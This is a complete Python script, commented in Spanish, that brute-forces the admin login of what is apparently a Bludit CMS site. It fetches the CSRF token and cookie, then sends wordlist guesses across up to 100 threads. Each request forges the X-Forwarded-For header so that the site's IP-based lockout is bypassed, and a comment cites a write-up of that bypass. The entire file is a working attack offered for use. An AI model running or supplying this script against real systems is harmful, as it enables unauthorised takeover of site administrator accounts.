import requests
import threading

loginOk = threading.Event()
foundPass = None

def obtencion_token(url):

	r = requests.get(url+'/admin/login')

	responseToken = r.text.split("name=\"tokenCSRF\" value=\"")[1].split("\">")[0]
	return responseToken,r.cookies

def brute(password,user,url):

	global foundPass

	#Obtenemos token y cookie necesario para montar la solicitud sobre el panel del login.
	token, cookie = obtencion_token(url)
	
	payload = {
		'tokenCSRF':token,
		'username':user,
		'password':password,
		'save':" ",
	}

	# Esta cabecera es la clave para que no se produzca el bloqueo por Ip
	# Info https://rastating.github.io/bludit-brute-force-mitigation-bypass/
	header = {
		'X-Forwarded-For':password
	}

	r = requests.post(url+'/admin/',data=payload,headers=header,cookies=cookie)

	if 'Nombre de usuario o' in r.text:
		print(f'[-]Failed -> {password} -- {token}')
	else:
		loginOk.set()
		foundPass = password
	
def main():

	###Variables####
	user = "***USER***"
	wordlistPass = "***WORDLIST***"
	url = "***http://dominio***"
	################


	with open(wordlistPass,"r") as file:
		passwords = [line.strip() for line in file]

	hilos = []
	maxHilos = 100 # Establecemos el numero de hilos


	for password in passwords:

		# Terminamos bucle si encontramos Passwor
		if loginOk.is_set(): 
			break

		# Controlamos el numero de hilos activo, a la espera.
		while threading.active_count() > maxHilos: 
			pass

		# Lanzamos hilo y pasamos argumentos a la funcion brute
		hilo = threading.Thread(target=brute, args=(password,user,url))
		hilos.append(hilo)
		hilo.start()

	# Esperamos a que cada hilo termine antes de continuar con el script.
	for hilo in hilos:
		hilo.join() 

	# Mostramos la Password encontrada.
	if foundPass:
		print(f'[+] Password: {foundPass}') 


if __name__ == '__main__':
	main()
